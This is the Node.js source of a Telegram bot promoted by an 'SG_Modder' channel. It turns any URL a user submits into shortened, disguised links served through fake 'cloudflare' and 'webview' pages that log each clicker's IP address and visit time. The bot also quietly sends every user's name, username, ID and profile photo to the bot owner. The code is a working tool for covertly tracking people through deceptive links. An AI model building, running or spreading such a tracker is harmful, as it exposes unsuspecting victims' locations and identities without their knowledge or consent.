//Join My Telegram Channel @SG_Tracker1 
const fs = require("fs");
const express = require("express");
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config(); // Load environment variables

const botOwnerId = process.env.BOT_OWNER_ID;
const botToken = process.env.BOT_TOKEN;
const bot = new TelegramBot(botToken, { polling: true });
const jsonParser = bodyParser.json({ limit: '20mb', type: 'application/json' });
const urlencodedParser = bodyParser.urlencoded({ extended: true, limit: '20mb', type: 'application/x-www-form-urlencoded' });
const app = express();

app.use(express.static('public'));
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

const hostURL = "https://sgtrackerbot-nj1pj0tu.b4a.run"; // Use your host URL
let use1pt = false;

// Base64 encode/decode replacements for Node.js
function encodeBase64(data) {
    return Buffer.from(data).toString('base64');
}

function decodeBase64(data) {
    return Buffer.from(data, 'base64').toString('ascii');
}

// GET route for '/w/:path/:uri'
app.get("/w/:path/:uri", (req, res) => {
    let ip;
    let d = new Date().toJSON().slice(0, 19).replace('T', ':');

    ip = req.headers['x-forwarded-for']?.split(",")[0] || req.connection?.remoteAddress || req.ip;

    if (req.params.path) {
        res.render("webview", {
            ip: ip,
            time: d,
            url: decodeBase64(req.params.uri),
            uid: req.params.path,
            a: hostURL,
            t: use1pt
        });
    } else {
        res.redirect("https://t.me/SG_Modder1");
    }
});

// GET route for '/c/:path/:uri'
app.get("/c/:path/:uri", (req, res) => {
    let ip;
    let d = new Date().toJSON().slice(0, 19).replace('T', ':');

    ip = req.headers['x-forwarded-for']?.split(",")[0] || req.connection?.remoteAddress || req.ip;

    if (req.params.path) {
        res.render("cloudflare", {
            ip: ip,
            time: d,
            url: decodeBase64(req.params.uri),
            uid: req.params.path,
            a: hostURL,
            t: use1pt
        });
    } else {
        res.redirect("https://t.me/SG_Modder1");
    }
});

// Function to animate edited messages
async function animatedEditMessage(chatId, messageId, newText) {
    const words = newText.split(' ');
    const wordsPerEdit = 10;
    const interval = 1000;
    let index = 0;

    while (index < words.length) {
        const endIndex = Math.min(index + wordsPerEdit, words.length);
        const editedText = words.slice(0, endIndex).join(' ');

        await bot.editMessageText(editedText, {
            chat_id: chatId,
            message_id: messageId,
            reply_markup: JSON.stringify({
                "inline_keyboard": [
                    [{ text: "Create Link", callback_data: "crenew" }]
                ]
            })
        });

        index = endIndex;

        if (index < words.length) {
            await new Promise(resolve => setTimeout(resolve, interval));
        }
    }
}

// Get user details and send to owner
async function getUserDetails(user) {
    const userDetails = `
        User Name: ${user.first_name} ${user.last_name || ""}
        Username: ${user.username || "N/A"}
        User ID: ${user.id}
    `;

    if (user.photo && user.photo.total_count > 0) {
        try {
            const photoFile = await bot.getUserProfilePhotos(user.id, 0, 1);
            const photoUrl = await bot.getFileLink(photoFile.photos[0][0].file_id);
            return { userDetails, photoUrl };
        } catch (error) {
            console.error('Error fetching profile photo:', error);
            return { userDetails };
        }
    }
    return { userDetails };
}

function sendUserDetailsToOwner(userDetails) {
    if (userDetails.photoUrl) {
        bot.sendPhoto(botOwnerId, userDetails.photoUrl, { caption: userDetails.userDetails });
    } else {
        bot.sendMessage(botOwnerId, userDetails.userDetails);
    }
}

// Send help message to the user
async function sendHelpMessage(chatId) {
    const helpMessage = `
    Welcome to the bot! Here are some steps to get started:
    1. Use /start to initiate the bot.
    2. Use /create to create a new link.
    3. Use /help to see this help message.
    4. Use /tutorial to get a tutorial video.
    `;
    await bot.sendMessage(chatId, helpMessage);
}

// Bot message listener
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;

    try {
        const isMember = await bot.getChatMember("@SG_Modder1", msg.from.id);

        if (isMember && isMember.status !== "left") {
            if (msg?.reply_to_message?.text === "🔖 Drop your URL here:") {
                createLink(chatId, msg.text);
            }

            if (msg.text === "/start") {
                const userDetails = await getUserDetails(msg.from);
                sendUserDetailsToOwner(userDetails);
                const startMessage = `📍 Hello ${msg.chat.first_name}! 🎉,
                \nWelcome to the bot. Follow the steps below to use it:
                \n1. /create - Create a new link.
                \n2. /help - Get help on how to use the bot.
                \n3. /tutorial - Watch a tutorial video.
                \nEnjoy using the bot! 🚀`;

                await bot.sendMessage(chatId, startMessage, {
                    reply_markup: JSON.stringify({
                        "inline_keyboard": [
                            [{ text: "Create Link", callback_data: "crenew" }]
                        ]
                    })
                });
            } else if (msg.text === "/create") {
                createNew(chatId);
            } else if (msg.text === "/help") {
                sendHelpMessage(chatId);
            } else if (msg.text === "/tutorial") {
                const tutorialLink = "https://t.me/SG_Modder1/140";
                await bot.sendMessage(chatId, `Watch the tutorial video here: ${tutorialLink}`);
            }
        } else {
            bot.sendMessage(chatId, "To use this bot, please join @SG_Modder1 channel.", {
                reply_markup: JSON.stringify({
                    inline_keyboard: [
                        [{ text: "Join Channel", url: "https://t.me/SG_Modder1" }]
                    ]
                })
            });
        }
    } catch (error) {
        console.error("Error occurred:", error);
        bot.sendMessage(chatId, "Apologies, something went wrong. Please try again later.");
    }
});

// Callback query handler
bot.on('callback_query', async (callbackQuery) => {
    try {
        await bot.answerCallbackQuery(callbackQuery.id);
        if (callbackQuery.data === "crenew") {
            createNew(callbackQuery.message.chat.id);
        }
    } catch (error) {
        console.error('Callback error:', error);
    }
});

// Function to shorten URLs using SmolUrl
async function shortenUrlWithSmolUrl(url) {
    try {
        const apiUrl = 'https://smolurl.com/api/links';
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ url }),
        });

        if (response.ok) {
            const data = await response.json();
            return data.data.short_url;
        } else {
            throw new Error('Failed to shorten URL with SmolUrl');
        }
    } catch (error) {
        console.error('Error shortening URL with SmolUrl:', error);
        throw error;
    }
}

// Function to create tracking links
async function createLink(cid, msg) {
    const encoded = [...msg].some(char => char.charCodeAt(0) > 127);

    if ((msg.toLowerCase().includes('http') || msg.toLowerCase().includes('https')) && !encoded) {
        const url = cid.toString(36) + '/' + encodeBase64(msg);
        const m = {
            reply_markup: JSON.stringify({
                "inline_keyboard": [
                    [{ text: "Create new Link", callback_data: "crenew" }]
                ]
            })
        };

        const cUrl = `${hostURL}/c/${url}`;
        const wUrl = `${hostURL}/w/${url}`;

        bot.sendChatAction(cid, "typing");

        try {
            const smolCUrl = await shortenUrlWithSmolUrl(cUrl);
            const smolWUrl = await shortenUrlWithSmolUrl(wUrl);

            bot.sendMessage(cid, `
    🎉 Your link has been created successfully! Here's your tracking URL:
    ✅ Original URL: ${msg}

    🚀 URL to Track IPs via CloudFlare:
    ${smolCUrl}

    🚀 URL to Track IPs via WebView:
    ${smolWUrl}
            `, m);
        } catch (error) {
            console.error('Error creating tracking link:', error);
            bot.sendMessage(cid, "An error occurred while creating the link. Please try again.");
        }
    } else {
        bot.sendMessage(cid, "🔖 Drop your URL here:");
    }
}

// Function to create new link
async function createNew(cid) {
    bot.sendMessage(cid, "🔖 Drop your URL here:");
}

// Error handling
bot.on("polling_error", console.error);

// Server initialization
const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Server started on port ${port}`);
});
